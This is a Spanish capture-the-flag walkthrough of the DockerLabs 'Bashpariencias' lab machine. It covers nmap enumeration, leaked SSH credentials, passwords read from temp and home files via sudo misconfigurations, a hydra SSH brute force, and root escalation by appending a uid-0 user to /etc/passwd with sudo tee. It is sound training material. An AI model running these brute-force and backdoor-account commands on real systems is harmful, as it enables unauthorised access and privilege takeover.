# Bashpariencias DockerLabs

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip bashpariencias.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh bashpariencias.tar
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 11:11 EDT
Nmap scan report for 172.18.0.2
Host is up (0.000038s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd
|_http-title: Leeme
|_http-server-header: Apache
8899/tcp open  ssh     OpenSSH 6.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a3:b0:db:99:e4:c6:a5:b2:5d:2b:36:b6:3e:d0:15:00 (ECDSA)
|_  256 8f:26:4e:8c:60:28:5c:14:03:b2:45:22:ae:e1:f9:24 (ED25519)
MAC Address: 02:42:AC:12:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.53 seconds
```

Si nos vamos a la pagina y en la seccion de `form.html` veremos en el codigo lo siguiente.

```
rosa:lacagadenuevo
```

Por lo que si hacemos lo siguiente.

### SSH

```shell
ssh rosa@<IP>
```

Metemos la contraseña y ya estariamos dentro de la maquina.

```
User = rosa
Pass = lacagadenuevo
```

### Escalate user juan

Si vemos los procesos del sistema, veremos que se esta ejecutando cada segundo un script que lo que hace es crear el archivo `.txt` de la contraseña del usuario `juan` en la carpeta de `/tmp`, por lo que tendremos que ser rapidos y hacer lo siguiente.

```shell
cd /tmp
cat passjuan.txt
```

Info:

```
hackwhitbash
```

Por lo que ya habremos obtenido la contarseña de `juan`.

```shell
su juan
```

Metemos esa contraseña y ya seriamos ese usuario.

```
User = juan
Pass = hackwhitbash
```

### Escalate user carlos

Si hacemos `sudo -l` podremos ver lo siguiente.

```
Matching Defaults entries for juan on 4663ea8d0df3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User juan may run the following commands on 4663ea8d0df3:
    (carlos) NOPASSWD: /usr/bin/tree
    (carlos) NOPASSWD: /usr/bin/cat
```

Que podemos ejecutar esos dos binarios como el usuario `carlos`.

```shell
sudo -u carlos tree -a /home/carlos/
```

Info:

```
/home/carlos/
├── .bash_history
├── .bash_logout
├── .bashrc
├── .cache
│   └── motd.legal-displayed
├── .local
│   └── share
│       └── nano
├── .misecreto.txt
├── .profile
└── password

5 directories, 7 files
```

Encontrando los siguientes archivos nos atraen 2.

```shell
sudo -u carlos cat /home/carlos/password
sudo -u carlos cat /home/carlos/.misecreto.txt
```

Info:

```
(password)

chocolateado

(.misecreto.txt)

No se que hacer solo recuerdo el principio de mi password , olvide los tres ultimos caracteres y si cierro sesion no la recupero.

chocolateXXX

Temo que me despidan como a rosa.
```

Si probamos con la contraseña `chocolateado` vamos a ver que funciona para el usuario `carlos` pero tambien con el otro se podria haber hecho de esta manera...

En nuestro host crearemos un diccionario con esas palabras para ver cual de todas es.

```shell
mp64 'chocolate?l?l?l' > dic.txt
```

```shell
hydra -l carlos -P dic.txt ssh://<IP> -t 64 -s 8899
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-07 12:01:47
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 17576 login tries (l:1/p:17576), ~275 tries per task
[DATA] attacking ssh://172.18.0.2:8899/
[8899][ssh] host: 172.18.0.2   login: carlos   password: chocolateado
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 21 final worker threads did not complete until end.
[ERROR] 21 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-07 12:02:03
```

Por lo que vemos nos saca tambien las credenciales.

```
User = carlos
Pass = chocolateado
```

```shell
su carlos
```

Metemos la contraseña y ya seriamos ese usuario.

### Privilege Escalation

Si hacemos `sudo -l` veremos lo siguiente.

```
Matching Defaults entries for carlos on 4663ea8d0df3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User juan may run the following commands on 4663ea8d0df3:
    (ALL:NOPASSWD) /usr/bin/tee
```

Por lo que podemos ejecutar ese binario como `root`, por lo que haremos lo siguiente.

En nuestro host, codificaremos una contraseña con un salteado con la herramienta `openssl`.

```shell
openssl passwd -1 -salt "root" "1234"
```

Info:

```
$1$root$.fAWE/htZAqQge.bvM16O/
```

Y ahora en nuestra maquina victima, haremos lo siguiente.

```shell
printf 'tester:$1$root$.fAWE/htZAqQge.bvM16O/:0:0:root:/root:/bin/bash\n' | sudo tee -a /etc/passwd
```

Info:

```
tester:$1$root$.fAWE/htZAqQge.bvM16O/:0:0:root:/root:/bin/bash
```

Lo que estamos haciendo aqui es añadir una linea en el `passwd` con ese usuario con la bash de `root`, por lo que cuando cambiemos a ese usuario, seremos `root` con la contarseña `1234` que le implementamos.

```shell
su tester
```

Metemos la contraseña `1234` y ya seremos `root`.
